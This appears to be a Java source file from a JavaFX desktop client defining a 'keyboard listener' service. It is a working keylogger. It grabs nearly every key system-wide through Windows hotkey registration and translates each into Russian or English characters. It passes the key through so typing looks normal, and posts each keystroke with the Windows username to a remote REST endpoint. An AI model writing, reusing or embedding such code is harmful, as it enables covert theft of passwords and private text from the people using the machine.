package ru.kolaer.client.javafx.services;

import java.awt.event.KeyEvent;
import java.nio.charset.Charset;
import java.util.concurrent.CompletableFuture;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.http.converter.StringHttpMessageConverter;
import org.springframework.web.client.RestTemplate;

import ru.kolaer.client.javafx.tools.Resources;
import ru.kolaer.client.javafx.tools.User32;
import ru.kolaer.client.javafx.tools.User32.MSG;

public class UserWindowsKeyListenerService implements LocaleService {
	private final Logger LOG = LoggerFactory.getLogger(UserWindowsKeyListenerService.class);
	
	private final RestTemplate restTemplate = new RestTemplate();
	private final String username = System.getProperty("user.name");
	
	private boolean isCapsLock = false;
	private boolean isRus = false;
	private int id;
	
	private boolean isRun = false;

	/**
	 * {@linkplain UserWindowsKeyListenerService}
	 */
	public UserWindowsKeyListenerService() {
		this.restTemplate.getMessageConverters().add(0, new StringHttpMessageConverter(Charset.forName("UTF-8")));
	}

	@Override
	public void setRunningStatus(boolean isRun) {
		this.isRun = isRun;
	}

	@Override
	public boolean isRunning() {
		return this.isRun;
	}

	@Override
	public String getName() {
		return "Слушатель клавиатуры";
	}

	@Override
	public void run() throws Exception {
		CompletableFuture.runAsync(() -> {
			for(int i = 8; i <= 222; i++){
				User32.RegisterHotKey(null, i, 0, i);
				if(id>40) {
					User32.RegisterHotKey(null, i + 1000, 0x0001, i);
					User32.RegisterHotKey(null, i + 2000, 0x0002, i);
					User32.RegisterHotKey(null, i + 3000, 0x0004, i);
					User32.RegisterHotKey(null, i + 4000, 0x0008, i);
				}
			}
		}).thenRunAsync(() -> {
			Thread.currentThread().setName("Прослушивание клавиатуры");
			
			final MSG msg = new MSG();
			
			if(User32.GetKeyState(20) == 1)
				this.isCapsLock = true;
			
			boolean shift = false;
			boolean ctrl = false;
			boolean alt = false;

			while(this.isRun){
				while(User32.GetMessage(msg, null, 0, 0, User32.PM_REMOVE)){
					if(msg.message == User32.WM_HOTKEY){
						
						if(!this.isRun)
							break;
						
						this.id = msg.wParam.intValue();

						if(this.id > 4000)
							this.id -= 4000;
						else if(this.id > 3000)
							this.id -= 3000;
						else if(this.id > 2000)
							this.id -= 2000;
						if(this.id > 1000)
							this.id -= 1000;
						
						User32.UnregisterHotKey(null, this.id);
						//if(id>40) {
							User32.UnregisterHotKey(null, this.id + 1000);
							User32.UnregisterHotKey(null, this.id + 2000);
							User32.UnregisterHotKey(null, this.id + 3000);
							User32.UnregisterHotKey(null, this.id + 4000);
						//}
						
						CompletableFuture.runAsync(() -> {	
							Thread.currentThread().setName("Отправление клавиши на сервер");
							if(this.id == 20)
								this.isCapsLock = !this.isCapsLock;

							this.isRus = User32.GetKeyboardLayout(User32.GetWindowThreadProcessId(User32.GetForegroundWindow(), 0)) == 25 ? true : false;
							String key = this.isRus ? getRusKey(this.id) : getEngKey(this.id);
						
							if(User32.GetKeyState(16) < 0){
								key = this.getShiftKey(this.id, key);
							}else if(this.isCapsLock){
								if(65 <= this.id && this.id <= 90){
									key = key.toUpperCase();
								}
							}
							LOG.info("ID: {} - ({})", this.id, key);
							
							this.restTemplate.postForObject(Resources.URL_TO_KOLAER_RESTFUL.toString() + "system/user/" + username + "/key", key, String.class);
							
						}).exceptionally(t -> {	
							LOG.error("Невозможно отправить сообщение на {}!", Resources.URL_TO_KOLAER_RESTFUL.toString() + "system/user/" + username + "/key");
							return null;
						});
						
						User32.keybd_event(this.id, 0, 0, 0);;

						if(shift && (User32.GetKeyState(0xA1) & 0x8000) == 0){
							shift = false;
							User32.keybd_event(0x10, 0, 2, 0);
						} else if((User32.GetKeyState(0xA1) & 0x8000) == 32768){
								shift = true;
						}

						if(ctrl && (User32.GetKeyState(0xA3) & 0x8000) == 0){
							ctrl = false;
							User32.keybd_event(0x11, 0, 2, 0);
						} else if((User32.GetKeyState(0xA3) & 0x8000) == 32768){
								ctrl = true;
						}

						if(alt && (User32.GetKeyState(0xA5) & 0x8000) == 0){
							alt = false;
							User32.keybd_event(0x12, 0, 2, 0);
						} else if((User32.GetKeyState(0xA5) & 0x8000) == 32768){
								alt = true;
						}

						User32.RegisterHotKey(null, this.id, 0, this.id);
						if(id>40) {
							User32.RegisterHotKey(null, this.id + 1000, 0x0001, this.id);
							User32.RegisterHotKey(null, this.id + 2000, 0x0002, this.id);
							User32.RegisterHotKey(null, this.id + 3000, 0x0004, this.id);
							User32.RegisterHotKey(null, this.id + 4000, 0x0008, this.id);
						}
					}
				}
			}
		}).exceptionally(t -> {
			LOG.error("Ошибка!", t);
			return null;
		});
	}

	@Override
	public void stop() throws Exception {
		this.isRun = false;
	}

	private String getShiftKey(int code, final String key) {
		
		if(65 <= code && code <= 90){
			return this.isCapsLock ? key.toLowerCase() : key.toUpperCase();
		}else{
			switch(code) {
				case 48: return ")";
				case 49: return "!";
				case 50: return isRus ? "\"" : "@";
				case 51: return isRus ? "№" : "#";
				case 52: return isRus ? ";" : "$";
				case 53: return "%";
				case 54: return isRus ? ":" : "^";
				case 55: return isRus ? "?" : "&";
				case 56: return "*";
				case 57: return "(";
				case 187: return "+";
				case 189: return "_";
				case 192: return isRus ? key.toUpperCase() : "`";
				default: return key;
			}
		}
	}
	
	private String getRusKey(int code) {
		switch(code) {
			case 65: return "ф";
			case 66: return "и";
			case 67:
				return "с";
			case 68:
				return "в";
			case 69:
				return "у";
			case 70:
				return "а";
			case 71:
				return "п";
			case 72:
				return "р";
			case 73:
				return "ш";
			case 74:
				return "о";
			case 75:
				return "л";
			case 76:
				return "д";
			case 77:
				return "ь";
			case 78:
				return "т";
			case 79:
				return "щ";
			case 80:
				return "з";
			case 81:
				return "й";
			case 82:
				return "к";
			case 83:
				return "ы";
			case 84:
				return "е";
			case 85:
				return "г";
			case 86:
				return "м";
			case 87:
				return "ц";
			case 88:
				return "ч";
			case 89:
				return "н";
			case 90:
				return "я";
			case 186:
				return "ж";
			case 188:
				return "б";
			case 190:
				return "ю";
			case 192:
				return "ё";
			case 219:
				return "х";
			case 221:
				return "ъ";
			case 222:
				return "э";
			default:
				return getEngKey(code);
		}
	}

	private String getEngKey(int code) {
		switch(code) {
			case 8:
				return "<BaskSpace>";
			case 9:
				return "<Tab>";
			case 13:
				return "<Enter>";
			case 16:
				return "<Shift>";
			case 17:
				return "<Ctrl>";
			case 18:
				return "<Alt>";
			case 19:
				return "<Pause>";
			case 20:
				return "<CapsLock>";
			case 27:
				return "<Esc>";
			case 32:
				return "<Spase>";
			case 33:
				return "<PageUp>";
			case 34:
				return "<PageDown>";
			case 35:
				return "<End>";
			case 36:
				return "<Home>";
			case 37:
				return "<ArrowLeft>";
			case 38:
				return "<ArrowUp>";
			case 39:
				return "<ArrowRigth>";
			case 40:
				return "<ArrowDown>";
			case 44:
				return "<PrtScr>";
			case 45:
				return "<Insert>";
			case 46:
				return "<Delete>";
			case 48:
				return "0";
			case 49:
				return "1";
			case 50:
				return "2";
			case 51:
				return "3";
			case 52:
				return "4";
			case 53:
				return "5";
			case 54:
				return "6";
			case 55:
				return "7";
			case 56:
				return "8";
			case 57:
				return "9";
			case 65:
				return "a";
			case 66:
				return "b";
			case 67:
				return "c";
			case 68:
				return "d";
			case 69:
				return "e";
			case 70:
				return "f";
			case 71:
				return "g";
			case 72:
				return "h";
			case 73:
				return "i";
			case 74:
				return "j";
			case 75:
				return "k";
			case 76:
				return "l";
			case 77:
				return "m";
			case 78:
				return "n";
			case 79:
				return "o";
			case 80:
				return "p";
			case 81:
				return "q";
			case 82:
				return "r";
			case 83:
				return "s";
			case 84:
				return "t";
			case 85:
				return "u";
			case 86:
				return "v";
			case 87:
				return "w";
			case 88:
				return "x";
			case 89:
				return "y";
			case 90:
				return "z";
			case 91:
				return "<WinLeft>";
			case 92:
				return "<WinRigth>";
			case 93:
				return "<Context>";
			case 96:
				return "<NumPad 0>";
			case 97:
				return "<NumPad 1>";
			case 98:
				return "<NumPad 2>";
			case 99:
				return "<NumPad 3>";
			case 100:
				return "<NumPad 4>";
			case 101:
				return "<NumPad 5>";
			case 102:
				return "<NumPad 6>";
			case 103:
				return "<NumPad 7>";
			case 104:
				return "<NumPad 8>";
			case 105:
				return "<NumPad 9>";
			case 106:
				return "<NumPad *>";
			case 107:
				return "<NumPad +>";
			case 109:
				return "<NumPad ->";
			case 110:
				return "<NumPad  .>";
			case 111:
				return "<NumPad />";
			case 112:
				return "<F1>";
			case 113:
				return "<F2>";
			case 114:
				return "<F3>";
			case 115:
				return "<F4>";
			case 116:
				return "<F5>";
			case 117:
				return "<F6>";
			case 118:
				return "<F7>";
			case 119:
				return "<F8>";
			case 120:
				return "<F9>";
			case 121:
				return "<F10>";
			case 122:
				return "<F11>";
			case 123:
				return "<F12>";
			case 144:
				return "<NumLock>";
			case 145:
				return "<ScrollLock>";
			case 154:
				return "<PrintScreen>";
			case 186:
				return ";";
			case 187:
				return "=";
			case 188:
				return ",";
			case 189:
				return "-";
			case 190:
				return ".";
			case 191:
				return "/";
			case 192:
				return "~";
			case 219:
				return "[";
			case 220:
				return "\\";
			case 221:
				return "]";
			case 222:
				return "'";

			default:
				return String.valueOf("Unknow: " + code);
		}
	}

	/**
	 * @param code
	 * @return
	 * @deprecated
	 */
	private int getKeyEvent(int code) {
		switch(code) {
			case 13:
				return KeyEvent.VK_ENTER;
			case 91:
			case 92:
				return KeyEvent.VK_WINDOWS;
			case 93:
				return KeyEvent.VK_NONCONVERT;
			case 157:
				return KeyEvent.VK_NONCONVERT;
			case 186:
				return KeyEvent.VK_SEMICOLON;
			case 187:
				return KeyEvent.VK_EQUALS;
			case 188:
				return KeyEvent.VK_COMMA;
			case 189:
				return KeyEvent.VK_MINUS;
			case 190:
				return KeyEvent.VK_PERIOD;
			case 191:
				return KeyEvent.VK_SLASH;
			case 192:
				return KeyEvent.VK_BACK_QUOTE;
			case 219:
				return KeyEvent.VK_OPEN_BRACKET;
			case 220:
				return KeyEvent.VK_BACK_SLASH;
			case 221:
				return KeyEvent.VK_CLOSE_BRACKET;
			default:
				return code;
		}
	}

}